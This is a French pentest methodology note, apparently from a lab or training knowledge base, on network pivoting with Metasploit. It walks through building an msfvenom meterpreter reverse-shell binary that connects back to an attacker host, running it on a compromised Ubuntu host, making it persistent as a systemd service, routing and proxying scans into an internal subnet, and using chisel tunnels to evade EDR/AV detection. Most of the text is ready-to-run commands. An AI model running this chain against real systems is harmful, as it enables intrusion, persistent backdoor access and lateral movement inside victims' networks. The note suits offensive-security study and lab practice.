```mermaid
flowchart LR
    A[Attaquant] -->|Proxy SOCKS| B(Metasploit)
    B -->|Session Meterpreter| C[Pivot Ubuntu]
    C -->|Routage/Autoroute| D[Réseau Interne]
```

## Génération de payload

Utilisation de **msfvenom** pour créer un binaire exécutable sur la cible.

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP_ATTAQUE> LPORT=8080 -f elf -o reverseShell
```

## Configuration du handler

Mise en place de l'écouteur dans **msfconsole** pour réceptionner la connexion.

```bash
msfconsole -q
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 8080
run
```

## Transfert et exécution

Transfert du binaire vers le pivot via **scp** et exécution sur la cible.

```bash
scp reverseShell ubuntu@<IP_UBUNTU>:~/
ssh ubuntu@<IP_UBUNTU>
chmod +x reverseShell
./reverseShell
```

## Configuration du proxy SOCKS

Utilisation du module auxiliaire de **Metasploit** pour créer un tunnel SOCKS.

```bash
bg
use auxiliary/server/socks_proxy
set SRVPORT 9050
set VERSION 4a
run
```

> [!warning]
> Attention à la version du proxy SOCKS (4a vs 5) pour la résolution DNS côté serveur vs client.

## Routage réseau

Configuration de la table de routage interne de **Metasploit** pour diriger le trafic vers le sous-réseau cible.

```bash
sessions -i 1
run autoroute -s 172.16.5.0/16
run autoroute -p
```

## Configuration de ProxyChains

Modification du fichier de configuration `/etc/proxychains.conf` pour rediriger le trafic via le port local 9050.

```bash
socks4 127.0.0.1 9050
```

## Scan réseau

Exécution de **nmap** via **proxychains**. Ces techniques sont détaillées dans les notes sur le *Pivoting, Tunneling, and Port Forwarding*.

```bash
proxychains nmap -sT -Pn 172.16.5.19 -p3389 -v
```

> [!danger]
> Le scan **nmap** via **proxychains** nécessite impérativement l'option **-sT** (TCP Connect) car le scan SYN n'est pas supporté par les proxies SOCKS.

> [!warning]
> L'option **-Pn** est critique lors du scan via proxy car les paquets ICMP ne sont pas routés par le tunnel SOCKS.

## Port forwarding

Redirection de port spécifique via **Meterpreter** pour accéder à des services distants.

```bash
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
xfreerdp /v:localhost:3300 /u:user /p:password
```

## Pivoting via SSH (sans Metasploit)

En l'absence de **Metasploit**, le tunneling SSH est la méthode privilégiée pour établir un accès dynamique.

```bash
# Création d'un tunnel SOCKS dynamique
ssh -D 9050 -N -f user@<IP_PIVOT>

# Local Port Forwarding pour un service spécifique
ssh -L 3300:172.16.5.19:3389 user@<IP_PIVOT> -N
```

## Gestion de la persistance sur le pivot

Pour maintenir l'accès au pivot, l'utilisation de services systemd ou de tâches cron est recommandée.

```bash
# Création d'un service systemd pour persister le reverse shell
cat <<EOF > /etc/systemd/system/pivot.service
[Unit]
Description=Persistence Service
[Service]
ExecStart=/home/ubuntu/reverseShell
Restart=always
[Install]
WantedBy=multi-user.target
EOF
systemctl enable --now pivot.service
```

## Techniques d'évasion (EDR/AV)

Le trafic de tunneling peut être détecté par des solutions de sécurité. L'utilisation de **SSH over HTTPS** ou de **chisel** avec chiffrement est préférable.

```bash
# Utilisation de Chisel pour masquer le trafic
./chisel server -p 8000 --reverse
./chisel client <IP_ATTAQUE>:8000 R:socks
```

## Pivoting via double pivot (multi-hop)

Pour atteindre un réseau derrière un second pivot, on enchaîne les tunnels.

```bash
# Depuis le pivot 1, rediriger le trafic vers le pivot 2
meterpreter > portfwd add -l 8080 -p 8080 -r 172.16.5.20
# Configurer ProxyChains pour pointer vers le port local 8080
```

## Commandes utiles

| Commande | Utilité |
| :--- | :--- |
| `sessions -i <ID>` | Reprendre une session Meterpreter |
| `run autoroute -p` | Voir les routes actives |
| `jobs` | Vérifier si le Proxy SOCKS tourne |
| `proxychains curl http://172.16.5.19` | Tester si le proxy fonctionne |

Ces manipulations s'inscrivent dans les méthodologies de *Linux Post-Exploitation* et du *Metasploit Framework*.